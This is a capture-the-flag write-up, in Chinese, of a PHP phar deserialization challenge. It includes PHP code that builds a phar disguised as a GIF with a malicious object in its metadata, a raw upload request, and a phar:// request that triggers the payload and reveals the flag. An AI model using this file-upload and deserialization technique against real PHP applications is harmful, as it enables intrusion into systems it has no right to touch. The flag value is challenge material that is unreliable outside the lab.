
# writeup

从页面代码可知,当运行一个对象且生命周期结束时会读取flag文件
此外, 在GET传入file参数时能读取文件,这时执行上传文件就能触发析构函数得到flag

构造一个phar

```php
<?php
class felove {
        public $name;
        public $noclass;
        public function __construct(){
                $this->name = "ksksks";
                $this->noclass = "123";
        }
        public function __destruct(){
                echo file_get_contents("/flag");
        }
}
$phar = new Phar('phar.phar',0,'');
$phar -> startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar -> addFromString('test.txt','test');
$object = new felove();
$phar -> setMetadata($object);
$phar -> stopBuffering();
?>
```

改名为1.gif上传

```burp
POST / HTTP/1.1
Host: 192.168.215.144
Content-Length: 471
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.215.144
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLWKI1wU9JaIcYr4b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.215.144/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryLWKI1wU9JaIcYr4b
Content-Disposition: form-data; name="upfile"; filename="1.gif"
Content-Type: image/gif

GIF89a<?php __HALT_COMPILER(); ?>
...
------WebKitFormBoundaryLWKI1wU9JaIcYr4b
Content-Disposition: form-data; name="uploaddd"

æäº¤
------WebKitFormBoundaryLWKI1wU9JaIcYr4b--
```

文件上传到`uploads/1.gif`

再通过phar协议反序列化执行

```burp
GET /?file=phar://./uploads/1.gif HTTP/1.1
Host: 192.168.215.144
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

```

得到`flag{20cb5a242d392e2c631f3c88036a126c}`
